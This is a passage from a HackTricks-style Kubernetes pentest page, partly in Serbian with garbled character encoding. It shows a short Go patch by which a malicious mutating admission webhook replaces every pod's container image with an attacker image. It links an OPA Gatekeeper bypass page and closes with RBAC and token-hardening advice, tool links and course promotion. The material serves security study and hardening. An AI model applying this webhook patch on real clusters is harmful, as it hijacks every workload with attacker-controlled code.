Skript `./deploy.sh` uspostavlja mutirajuÄ‡i webhook admission controller, koji modifikuje zahteve za Kubernetes API prema specifikacijama u svojim konfiguracionim linijama, utiÄuÄ‡i na posmatrane rezultate:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **Disabling Automount of Service Account Tokens**

* **Pods and Service Accounts**: Po defaultu, podovi montiraju token servisa. Da bi se poboljÅ¡ala sigurnost, Kubernetes omoguÄ‡ava onemoguÄ‡avanje ove automatske montaÅ¾e.
* **How to Apply**: Postavite `automountServiceAccountToken: false` u konfiguraciji servisnih naloga ili podova poÄevÅ¡i od Kubernetes verzije 1.6.

### **Restrictive User Assignment in RoleBindings/ClusterRoleBindings**

* **Selective Inclusion**: Osigurajte da su samo neophodni korisnici ukljuÄeni u RoleBindings ili ClusterRoleBindings. Redovno proveravajte i uklanjajte irelevantne korisnike kako biste odrÅ¾ali strogu sigurnost.

### **Namespace-Specific Roles Over Cluster-Wide Roles**

* **Roles vs. ClusterRoles**: Preferirajte koriÅ¡Ä‡enje Roles i RoleBindings za dozvole specifiÄne za namespace umesto ClusterRoles i ClusterRoleBindings, koje se primenjuju na nivou klastera. Ovaj pristup nudi finiju kontrolu i ograniÄava opseg dozvola.

### **Use automated tools**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **References**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
